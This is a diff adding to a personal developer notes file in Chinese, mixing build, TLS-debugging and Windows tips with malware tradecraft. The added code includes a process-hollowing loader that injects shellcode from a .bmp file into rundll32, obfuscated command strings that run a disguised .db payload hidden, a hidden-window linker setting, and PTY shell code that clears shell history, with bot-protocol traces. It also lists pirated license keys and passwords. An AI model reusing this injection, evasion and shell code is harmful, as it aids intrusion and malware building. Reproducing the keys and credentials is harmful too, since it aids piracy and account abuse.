@@ -204,6 +204,9 @@ sudo cp makeself.sh /usr/bin/makeself
 #打包
 makeself.sh [args] archive_dir file_name label startup_script [script_args]
 运行脚本  [可选参数] 目标sh所在目录  打包完可执行文件名  sh文件（相对于archive_dir的路径） sh可选参数
+
+eg：
+sh makeself.sh bot bot_output "- " ./install.sh
 ```
 
 
@@ -836,7 +839,12 @@ ret = wcstombs(char *, (wchar_t*), NameSize);
 ```
 打开任务管理器，详细信息，创建转储文件，用wingdb打开。
 找到入口函数地址，用ida加载进程文件，找到入口函数，设置基址。根据wingdb堆栈地址，找到对应的函数。
+补4个0 ？
 ```
+
+<img src="..\images\Snipaste_2023-10-31_21-44-03.png" alt="Snipaste_2023-10-31_21-44-03" style="zoom: 67%;" />
+
+![Snipaste_2023-10-31_21-56-10](..\images\Snipaste_2023-10-31_21-56-10.png)
 
 ### 进入system用户
 
@@ -925,5 +933,823 @@ ssh-keygen -R 192.168.8.134
 7z a package-p.7z I://* -r -mx=9 -p1qazZAQ! -mhe=on
 7z a package-p.7z .\lib\* -r -mx=9 -p123 -mhe=on
 !QAZzaq1
+```
+
+### 生成密钥对
+
+```
+openssl genrsa -out rsa_private_key.pem 2048
+	 openssl pkcs8 -topk8 -inform PEM -in rsa_private_key.pem -outform PEM -nocrypt > rsa_private_key_pkcs8.pem
+openssl rsa -in rsa_private_key.pem -pubout -out rsa_public_key_2048.pub
+```
+
+win7 Process Monitor提示无法加载驱动
+
+```
+安装这个补丁
+https://www.microsoft.com/en-us/download/confirmation.aspx?id=46148
+```
+
+### mbedtls 错误打印输出
+
+```
+			char error_buf[100]; // 用于存储错误描述的缓冲区
+			mbedtls_strerror(n, error_buf, sizeof(error_buf));
+			p_debug("Error description: %s\n", error_buf);
+```
+
+### mbedtls debug输出
+
+```
+void my_debug_function(void *ctx, int level, const char *file, int line, const char *str)
+{
+	p_debug("%s", str);
+}
+
+mbedtls_ssl_conf_dbg(&conf, my_debug_function, NULL);
+mbedtls_debug_set_threshold(4);
+	
+```
+
+
+
+```
+    	char test[5] ={0x00,0x00,0x00,0xAE,0x00};
+		pel_send_msg(client,test, 5);
+		char test2[128] = {0x00,0x00,0x00,0x00};
+		memcpy(test2 + 4, &host_info, sizeof(host_basic_info));
+		pel_send_msg(client,test2, sizeof(host_basic_info) + 4);
+```
+
+E387
+
+D9A4
+
+B01B
+
+```
+	FILE* fp;
+	size_t size;
+	unsigned char* buffer;
+
+	fp = fopen("cloudmusic.bmp", "rb");
+
+	fseek(fp, 0, SEEK_END);
+
+	size = ftell(fp);
+	fseek(fp, 0, SEEK_SET);
+	buffer = (unsigned char*)malloc(size);
+	fread(buffer, size, 1, fp);
+
+	char* v7A = (char*)VirtualAlloc(0, size, 0x3000u, 0x40u);
+	memcpy((void*)v7A, buffer, size);
+
+	struct _PROCESS_INFORMATION ProcessInformation;
+	struct _STARTUPINFOA StartupInfo;
+	void* v24;
+	CONTEXT Context;
+	DWORD DwWrite = 0;
+	memset(&StartupInfo, 0, sizeof(StartupInfo));
+	StartupInfo.cb = 68;
+	BOOL result = CreateProcessA(0, (LPSTR)"rundll32.exe", 0, 0, 0, 0x44u, 0, 0, &StartupInfo, &ProcessInformation);
+	if (result)
+	{
+		Context.ContextFlags = 65539;
+		GetThreadContext(ProcessInformation.hThread, &Context);
+		v24 = VirtualAllocEx(ProcessInformation.hProcess, 0, size, 0x1000u, 0x40u);
+		WriteProcessMemory(ProcessInformation.hProcess, v24, v7A, size, (SIZE_T*)&DwWrite);
+		Context.Eip = (DWORD)v24;
+		SetThreadContext(ProcessInformation.hThread, &Context);
+		ResumeThread(ProcessInformation.hThread);
+		CloseHandle(ProcessInformation.hThread);
+		result = CloseHandle(ProcessInformation.hProcess);
+	}
+```
+
+触发异常
+
+```
+		int* pValue = NULL;
+		printf("into Try.\n");
+		*pValue = 0x114514;
+```
+
+centos7-6  957
+
+centos7-9  1160
+
+
+
+```
+	char tmp[128]{ 0 };//"cmd /c rundll32 %ALLUSERSPROFILE%\\Windows\\SoftwareDistribution\\ReportingEvents.db Entery"
+	(DWORD&)tmp[0] += 0x1988793F; (DWORD&)tmp[0] += 0x06DBF424; (DWORD&)tmp[4] += 0x666EEDF7; (DWORD&)tmp[4] += 0x0BB17538;
+	(DWORD&)tmp[8] += 0x6BC9F939; (DWORD&)tmp[8] += 0x009A753C; (DWORD&)tmp[12] += 0x191ED836; (DWORD&)tmp[12] += 0x07135B36;
+	(DWORD&)tmp[16] += 0x45B165A7; (DWORD&)tmp[16] += 0x069ADB7E; (DWORD&)tmp[20] += 0x4ACD0685; (DWORD&)tmp[20] += 0x07784CD0;
+	(DWORD&)tmp[24] += 0x3D6597C7; (DWORD&)tmp[24] += 0x11ECB88C; (DWORD&)tmp[28] += 0x40EC7E66; (DWORD&)tmp[28] += 0x045FCAE0;
+	(DWORD&)tmp[32] += 0x60789F39; (DWORD&)tmp[32] += 0x08DEBCEC; (DWORD&)tmp[36] += 0x7219326A; (DWORD&)tmp[36] += 0x05563204;
+	(DWORD&)tmp[40] += 0x56FF6FFF; (DWORD&)tmp[40] += 0x1853EC74; (DWORD&)tmp[44] += 0x2E6A21C6; (DWORD&)tmp[44] += 0x330D52A0;
+	(DWORD&)tmp[48] += 0x67D3757A; (DWORD&)tmp[48] += 0x0170EFF8; (DWORD&)tmp[52] += 0x61CEAB83; (DWORD&)tmp[52] += 0x07A3C8F0;
+	(DWORD&)tmp[56] += 0x57E6F1F4; (DWORD&)tmp[56] += 0x118D836E; (DWORD&)tmp[60] += 0x296C27E7; (DWORD&)tmp[60] += 0x28F04688;
+	(DWORD&)tmp[64] += 0x610BFD57; (DWORD&)tmp[64] += 0x1163730E; (DWORD&)tmp[68] += 0x55AF4230; (DWORD&)tmp[68] += 0x11BF2744;
+	(DWORD&)tmp[72] += 0x609B90EB; (DWORD&)tmp[72] += 0x0DC9E55A; (DWORD&)tmp[76] += 0x5E276B30; (DWORD&)tmp[76] += 0x06070844;
+	(DWORD&)tmp[80] += 0x66D529A0; (DWORD&)tmp[80] += 0x076FF6C2; (DWORD&)tmp[84] += 0x796B6052; (DWORD&)tmp[84] += 0x00070522;
+	(DWORD&)tmp[88] += 0xD432DF56; (DWORD&)tmp[88] += 0x2BCD20AA;
+
+	char tmp2[8] = { 0 }; //net stop WlanSvr
+	(DWORD&)tmp2[0] += 0x18D80323; (DWORD&)tmp2[0] += 0x079C624B; (DWORD&)tmp2[4] += 0x5AE1655B; (DWORD&)tmp2[4] += 0x158E0F18;
+	(DWORD&)tmp2[8] += 0x5F77F926; (DWORD&)tmp2[8] += 0x01F45DFA; (DWORD&)tmp2[12] += 0x70015EF8; (DWORD&)tmp2[12] += 0x0274F476;
+	(DWORD&)tmp2[16] += 0xFF1AC936; (DWORD&)tmp2[16] += 0x00E536CA;
+
+	if (mainIsAdministratorUser()) {
+		OutputDebugStringW(L"start server");
+		WinExec(tmp2, SW_HIDE);
+	}
+	else {
+		OutputDebugStringW(L"rundll32");
+		WinExec(tmp, SW_HIDE);
+	}
+
+```
+
+### 隐藏窗口
+
+```
+#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")//不显示窗口
+#pragma comment(linker,"/MERGE:.rdata=.text /MERGE:.data=.text /SECTION:.text,EWR")//减小编译体积
+
+```
+
+### dll to lib
+
+```
+lib /machine:x64 /def:sqlite3.def
+```
+
+### kali密码
+
+```
+kali
+kali
+```
+
+### ssh免密登录
+
+```
+本地客户端生成公私钥：（一路回车默认即可）
+> ssh-keygen
+把id_rsa.pub的内容写入到服务器用户或root目录下的.ssh目录的authorized_keys
+cd ~/.ssh
+vim authorized_keys
+```
+
+### win10自带端口转发
+
+```
+netsh interface portproxy add v4tov4 listenport=4444 connectaddress=192.168.8.134 connectport=4444
+
+cmd
+netsh interface portproxy reset
+```
+
+### windows内核调试
+
+```
+
+$$>a<E:\yu\Desktop\Tools\myAttachProc.wds 0n+Pid
+```
+
+### 在公网接收数据有问题。原因是recv 的时候len，会被分段。还要加一个记录实际的已经接收的长度。
+
+```
+	int n = 0;
+	size_t sum = 0;
+	char* offset = buf;
+	unsigned int recvLen = len; //修改这里
+	while (sum < len) {
+		if (len <= 0 || len > MAXBUF) {
+			return TCP_ERROR;
+		}
+		n = recv(client, offset, recvLen, 0);
+		printf("recvall n:%d \n", n);
+		if (n < 0 || n > MAXBUF) {
+			return TCP_ERROR;
+		}
+		if (n == 0) {
+			return TCP_ERROR;
+		}
+
+		if (n < 0) {
+			return TCP_ERROR;
+		}
+		recvLen -= n; //修改这里
+		sum += n;
+
+		offset += n;
+	}
+```
+
+### 无法从“const char”转换为“char *
+
+```
+项目属性  C++   语言   把符合模式改为 否 
+```
+
+### 010 Editor 激活码
+
+```
+Username：Brucy
+Serial：218o1A9CEA2E5227
+```
+
+### cmd 查md5值
+
+```
+windows ：
+	certutil -hashfile filename
+linux :
+	md5sum filename
+```
+
+### eset 激活码
+
+```
+K6EC-X5BA-HUH3-N4AS-CURJ
+```
+
+### 提取.lib静态库中的obj文件
+
+#### lib /list ldrv.lib  获取obj名称
+
+```
+C:\Users\admin\Desktop>lib /list ldrv.lib
+Microsoft (R) Library Manager Version 14.29.30148.0
+Copyright (C) Microsoft Corporation.  All rights reserved.
+
+..\iTEMP\ldrvWin32Release\instdrv.obj
+..\iTEMP\ldrvWin32Release\loaderdrv.obj
+..\iTEMP\ldrvWin32Release\mem.obj
+..\iTEMP\ldrvWin32Release\readwrt.ob
+```
+
+#### link -lib /extract:..\iTEMP\ldrvWin32Release\loaderdrv.obj ldrv.lib    导出obj在当前路径
+
+```
+C:\Users\admin\Desktop>link -lib /extract:..\iTEMP\ldrvWin32Release\loaderdrv.obj ldrv.lib
+Microsoft (R) Library Manager Version 14.29.30148.0
+Copyright (C) Microsoft Corporation.  All rights reserved.
+```
+
+### vs修改输出文件名
+
+```
+#pragma comment(linker,"/OUT:\"../bin/MarsSnake64.dll\"")
+属性 > 连接器 > 常规 > 把输出文件选项的内容删除。
+```
+
+### 文件下载时，打开方式rb。 如果是rb+ 则有部分文件读取失败（rb+ 已可读写的权限）
+
+
+
+### sudo环境变量错误
+
+```
+$sudo visudo
+在Defaults        secure_path  追加需要的环境变量。
+ctrl+O  回车  保存    ctrl+x 退出。
+```
+
+### go vscode 用root调试
+
+```
+// .vscode/launch.json
+{
+    // Use IntelliSense to learn about possible attributes.
+    // Hover to view descriptions of existing attributes.
+    // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387
+    "version": "0.2.0",
+    "go.goroot": "/usr/local/go",
+    "configurations": [
+      {
+        "name": "Launch",
+        "type": "go",
+        "request": "launch",
+        "mode": "auto",
+        "program": "${fileDirname}",
+        "env": {},
+        "args": ["-d"],
+        
+        // 用root用户调试，两个一起用
+        "console": "integratedTerminal",
+        "asRoot": true,
+        
+        
+        "dlvFlags": ["--check-go-version=false"]
+      }
+      
+    ]
+    
+}
+```
+
+### 打印buf  16进制  + 字节
+
+```
+#define DEBUG_BUF_SIZE 512
+void my_print_buf(const unsigned char *buf, size_t len )
+{
+    char str[DEBUG_BUF_SIZE];
+    char txt[17];
+    size_t i, idx = 0;
+
+    snprintf( str + idx, sizeof( str ) - idx, "dumping (%u bytes)\n", (unsigned int) len );
+    printf("%s", str);
+    idx = 0;
+    memset( txt, 0, sizeof( txt ) );
+    for( i = 0; i < len; i++ )
+    {
+        if( i >= 4096 )
+            break;
+
+        if( i % 16 == 0 )
+        {
+            if( i > 0 )
+            {
+                snprintf( str + idx, sizeof( str ) - idx, "  %s\n", txt );
+                printf("%s", str );
+
+                idx = 0;
+                memset( txt, 0, sizeof( txt ) );
+            }
+
+            idx += snprintf( str + idx, sizeof( str ) - idx, "0x%04x: ",
+                             (unsigned int) i );
+
+        }
+
+        idx += snprintf( str + idx, sizeof( str ) - idx, " %02x",
+                         (unsigned int) buf[i] );
+        txt[i % 16] = ( buf[i] > 31 && buf[i] < 127 ) ? buf[i] : '.' ;
+    }
+
+    if( len > 0 )
+    {
+        for( /* i = i */; i % 16 != 0; i++ )
+            idx += snprintf( str + idx, sizeof( str ) - idx, "   " );
+        snprintf( str + idx, sizeof( str ) - idx, "  %s\n", txt );
+        printf( "%s", str );
+    }
+}
+
+
+0000:  00 00 00 c6 5e 7f 03 01 01 07 50 41 43 4b 41 47  ....^.....PACKAG
+0010:  45 01 ff 80 00 01 06 01 04 54 79 70 65 01 06 00  E........Type...
+0020:  01 08 42 6f 74 43 6f 75 6e 74 01 06 00 01 07 42  ..BotCount.....B
+0030:  6f 74 4c 69 73 74 01 ff 82 00 01 0b 50 61 72 61  otList......Para
+0040:  6d 4c 65 6e 67 74 68 01 06 00 01 05 50 61 72 61  mLength.....Para
+0050:  6d 01 ff 84 00 01 07 43 6f 6e 74 65 6e 74 01 0a  m......Content..
+0060:  00 00 00 16 ff 81 02 01 01 08 5b 5d 73 74 72 69  ..........[]stri
+```
+
+
+
+### 封装 linux 交互式终端，键盘输入回显
+
+```
+#include <sys/ioctl.h>
+#include <sys/select.h>
+
+#include <stddef.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <string.h>
+#include <pthread.h>
+
+
+#include <termios.h>
+
+
+#define BUFSIZE     4096
+
+#define ERROR       1
+
+#define HOMEDIR		"/root"
+
+#define true 1
+#define false 0
+
+#define PEL_SUCCESS     1
+#define PEL_ERROR       0
+
+
+typedef struct bashPtyInfo_
+{
+    struct winsize ws;
+    size_t  block_size;
+    pthread_t   read_pty_pid;
+    char    term[64];
+    char    bash_name[64];
+
+}bashPtyInfo;
+
+typedef void *(*read_pty)(unsigned char* data, unsigned int len);
+typedef void *(*write_pty)(unsigned char* data, unsigned int len);
+
+
+typedef struct pthreadPtyParam_
+{
+    int pty;
+    int block_size;
+    read_pty    read_cb;
+}pthreadPtyParam;
+
+int readPtyMessage(pthreadPtyParam* Parm) {
+	fd_set rd;
+    int n = 0, pty = Parm->pty, len = 0;
+    char *buffer = (char*)malloc(Parm->block_size);
+
+    while (1) {
+        bzero(buffer, Parm->block_size);
+        FD_ZERO(&rd);
+        // FD_SET(client, &rd);
+        FD_SET(pty, &rd);
+        n = pty;
+        if (select(n + 1, &rd, NULL, NULL, NULL) < 0){ // 阻塞等待数据
+            perror("select");
+            break;
+        }
+        if (FD_ISSET(pty, &rd)) { // 为true表示终端有数据(如bash指令结果)可读
+            len = read(pty, buffer, Parm->block_size);
+
+            if (len == 0)
+                break;
+            if (len < 0){
+                // perror("err: ");
+                break;
+            }
+            Parm->read_cb(buffer, len);
+        }
+    }
+    Parm->read_cb("end", 3);
+    close(pty);
+}
+
+// int runshell(bashPtyInfo* ptyInfo, read_pty read_cb, write_pty write_cb)
+int runshell(bashPtyInfo* ptyInfo, read_pty read_cb)
+{
+	fd_set rd;
+	struct winsize ws;
+	char *slave, *temp, *shell;
+	int ret, len, pid, pty, tty, n;
+	char buf[BUFSIZE + 1] = {0};//zys 20230215
+	int status;
+
+    bashPtyInfo myPtyInfo  = {0};
+    memcpy(&myPtyInfo, ptyInfo, sizeof(bashPtyInfo));
+
+	if (openpty(&pty, &tty, NULL, NULL, NULL) < 0) // 找到一个可用的伪终端, 将主句柄和从句柄分别赋予pty(pseudo, 伪终端)和tty(teletypes, 终端)
+		return (ERROR);
+
+	slave = ttyname(tty);
+
+	if (slave == NULL)
+		return (ERROR);
+
+	chdir(HOMEDIR);
+	putenv("HISTFILE=");
+
+	setenv("TERM", (char *)myPtyInfo.term, 1);
+
+
+	if (ioctl(pty, TIOCSWINSZ, &myPtyInfo.ws) < 0) // 设置终端窗口大小(tioc set window size)
+		return (ERROR);
+
+
+
+    temp = (char *)malloc(20 + strlen(myPtyInfo.bash_name));
+    if (temp == NULL)
+        return (ERROR);
+    strcpy(temp, "exec ");
+    strcpy(temp, myPtyInfo.bash_name);
+
+
+	pid = fork();
+
+	if (pid < 0) {
+		free(temp);
+		return (ERROR);
+	}
+
+	if (pid == 0) { // 子进程: 
+		// close(g_sockfd);
+		close(pty);
+
+		if (setsid() < 0) {
+			free(temp);
+			return (ERROR);
+		}
+
+		if (ioctl(tty, TIOCSCTTY, NULL) < 0) { // 将tty作为本进程的控制终端
+			free(temp);
+			return (ERROR);
+		}
+
+		dup2(tty, 0); // 复制tty到文件描述符0(stdin)
+		dup2(tty, 1); // 复制tty到文件描述符1(stdout)
+		dup2(tty, 2); // 复制tty到文件描述符2(stderr)
+
+		if (tty > 2)
+			close(tty);
+
+		shell = (char *)malloc(64);
+
+		if (shell == NULL) {
+			free(temp);
+			return (ERROR);
+		}
+
+		// strcpy(shell, "/bin/bash");
+		strcpy(shell, myPtyInfo.bash_name);
+
+		execl(shell, shell + 5, "-c", temp, (char *)0); // 转到新进程, 执行bash命令
+		free(temp);
+		free(shell);
+
+		return 0;
+	} else { // 以下是主进程的操作
+		close(tty);
+
+        pthreadPtyParam *p_parm = (pthreadPtyParam*)malloc(sizeof(pthreadPtyParam));
+        p_parm->block_size = myPtyInfo.block_size;
+        p_parm->pty = pty;
+        p_parm->read_cb = read_cb;
+		pthread_create(&ptyInfo->read_pty_pid, NULL, readPtyMessage, p_parm); //创建一个线程去接受指令，写入mq消息队列
+
+		return pty;
+	}
+}
+
+
+
+
+void read_message(unsigned char* data, unsigned int len) {
+    printf("%s", data);
+    fflush(stdout);
+}
+
+
+int main(int argc, char const *argv[])
+{
+    printf("wait...\n");
+    bashPtyInfo ptyInfo = {0};
+    char* bash = getenv("SHELL");
+    
+    if (strlen(bash) > 0)
+        strcat(ptyInfo.bash_name, bash);
+    else
+    {
+        strcat(ptyInfo.bash_name, "/bin/sh");
+    }
+    
+    strcat(ptyInfo.term, "vt100");
+    ptyInfo.block_size = 4096;
+
+
+    ioctl(STDIN_FILENO, TIOCGWINSZ, &ptyInfo.ws);
+
+    int pty = runshell(&ptyInfo, read_message);
+	
+
+
+	struct termios tp, tr;
+	if (isatty(1)) { // stdout是终端
+		if (tcgetattr(1, &tp) < 0) { // 获取终端的stdout的参数
+			return 1;
+		}
+
+		memcpy((void *)&tr, (void *)&tp, sizeof(tr));
+
+		tr.c_iflag |= IGNPAR;
+		tr.c_iflag &=
+		    ~(ISTRIP | INLCR | IGNCR | ICRNL | IXON | IXANY | IXOFF);
+		tr.c_lflag &=
+		    ~(ISIG | ICANON | ECHO | ECHOE | ECHOK | ECHONL | IEXTEN);
+		tr.c_oflag &= ~OPOST;
+
+		tr.c_cc[VMIN] = 1;
+		tr.c_cc[VTIME] = 0;
+
+		if (tcsetattr(1, TCSADRAIN, &tr) < 0) { // 允许排空(drain)stdout的缓冲区, 并设置串口参数
+			return 1;
+		}
+        
+	}
+
+    char buffer[4096] = {0};
+    fd_set rd;
+    int len, res;
+    while (1) {
+		bzero(buffer, 4096);
+
+        FD_ZERO(&rd);
+		FD_SET(0, &rd); 
+
+		if (select(0 + 1, &rd, NULL, NULL, NULL) < 0) { // 同时监听终端程序的标准输入以及界面程序写入的管道
+			break;
+		}
+		if (FD_ISSET(0, &rd)) { // 终端有按键输入
+            if ((len = read(0, buffer, BUFSIZE)) < 0) {
+                break;
+            }
+            if (len == 0) {
+                fprintf(stderr, "stdin: end-of-file\n");
+                break;
+            }
+
+            res = write(pty, buffer, strlen(buffer)); // 写入管道, 让界面程序读取
+            if (res == -1) {
+                fprintf(stderr, "Write error on pipe\n");
+                exit(EXIT_FAILURE);
+            }
+		}
+    }
+    
+    return 0;
+}
+
+```
+
+mojie jugpoj@bougc.com  密码一样
+
+### test
+
+```
+
+#include <termios.h>
+#include <stddef.h>
+#include <sys/select.h>
+#include <unistd.h>
+#include <sys/ioctl.h>
+#include <stdio.h>
+#include <pthread.h>
+
+typedef struct bashInfo_
+{
+    struct winsize  ws;
+    char            bash_name[32];
+    char            tty_name[32]
+}bashInfo;
+
+typedef struct threadInfo_
+{
+	int			pty;
+	send_msg	send_cb;
+}threadInfo;
+
+
+#define ERROR       0
+#define SOCK_ERROR  ERROR
+
+
+#define REAL_BUFSIZE	4096
+
+typedef void*(*send_msg)(char* buf, int len);
+
+
+
+void readPty(threadInfo* thread_info) {
+	fd_set rd;
+	int pty = thread_info->pty;
+	int len;
+	char buf[REAL_BUFSIZE] = {0};
+	while (1) {
+		FD_ZERO(&rd);
+		
+		FD_SET(pty, &rd);
+		if (select(pty + 1, &rd, NULL, NULL, NULL) < 0){
+			perror("select");
+			goto FAIL; 
+		}
+		if (FD_ISSET(pty, &rd)) { 
+			len = read(pty, buf, REAL_BUFSIZE);
+
+			if (len == 0)
+				break;
+			if (len < 0){
+				break;
+			}
+			
+			thread_info->send_cb(buf, len);
+		}
+	}
+FAIL:
+	thread_info->send_cb("end", 0);
+}
+
+int runshell(bashInfo* bash_info, send_msg* send_cb)
+{
+	fd_set rd;
+	struct winsize ws;
+	char *slave, *temp, *shell, *rcfile;
+	int ret, len, pid, pty, tty, n;
+	char buf[REAL_BUFSIZE + 1] = {0};
+
+	int status;
+
+	if (openpty(&pty, &tty, NULL, NULL, NULL) < 0) // 找到一个可用的伪终端, 将主句柄和从句柄分别赋予pty(pseudo, 伪终端)和tty(teletypes, 终端)
+		return (ERROR);
+
+	slave = ttyname(tty);
+
+	if (slave == NULL)
+		return (ERROR);
+
+	chdir("/root");
+	putenv("HISTFILE=");
+
+	buf[len] = '\0';
+	setenv("TERM", bash_info->bash_name, 1);
+
+
+
+	if (ioctl(pty, TIOCSWINSZ, bash_info->ws) < 0) // 设置终端窗口大小(tioc set window size)
+		return (ERROR);
+
+
+	temp = (char *)malloc(20);
+	if (temp == NULL)
+		return (ERROR);
+	strcpy(temp, "exec bash ");
+
+
+	pid = fork();
+
+	if (pid < 0) {
+		free(temp);
+		return (ERROR);
+	}
+
+	if (pid == 0) { // 子进程: 
+		// close(g_sockfd);
+		close(pty);
+
+		if (setsid() < 0) {
+			free(temp);
+			return (ERROR);
+		}
+
+		if (ioctl(tty, TIOCSCTTY, NULL) < 0) { // 将tty作为本进程的控制终端
+			free(temp);
+			return (ERROR);
+		}
+
+		dup2(tty, 0); // 复制tty到文件描述符0(stdin)
+		dup2(tty, 1); // 复制tty到文件描述符1(stdout)
+		dup2(tty, 2); // 复制tty到文件描述符2(stderr)
+
+		if (tty > 2)
+			close(tty);
+
+		shell = (char *)malloc(10);
+
+		if (shell == NULL) {
+			free(temp);
+			return (ERROR);
+		}
+
+		strcpy(shell, bash_info->bash_name);
+
+		execl(shell, shell + 5, "-c", temp, (char *)0); // 转到新进程, 执行bash命令
+		free(temp);
+		free(shell);
+
+		return 0;
+	} else { // 以下是主进程的操作
+		int pid;
+
+		threadInfo* thread_info = (threadInfo*)malloc(sizeof(threadInfo));
+		thread_info->pty = pty;
+		thread_info->send_cb = send_cb;
+		pthread_create(&pid, NULL, readPty, thread_info); //创建一个线程去接受指令，写入mq消息队列
+
+	}	
+
+	return pty;
+
+}
+
+void read_pty(char* buf, int len)
+{
+	printf("%s", buf);
+	fflush(stdout);
+}
+
+
+int main(int argc, char const *argv[])
+{
+    /* code */
+    return 0;
+}
+
 ```
 
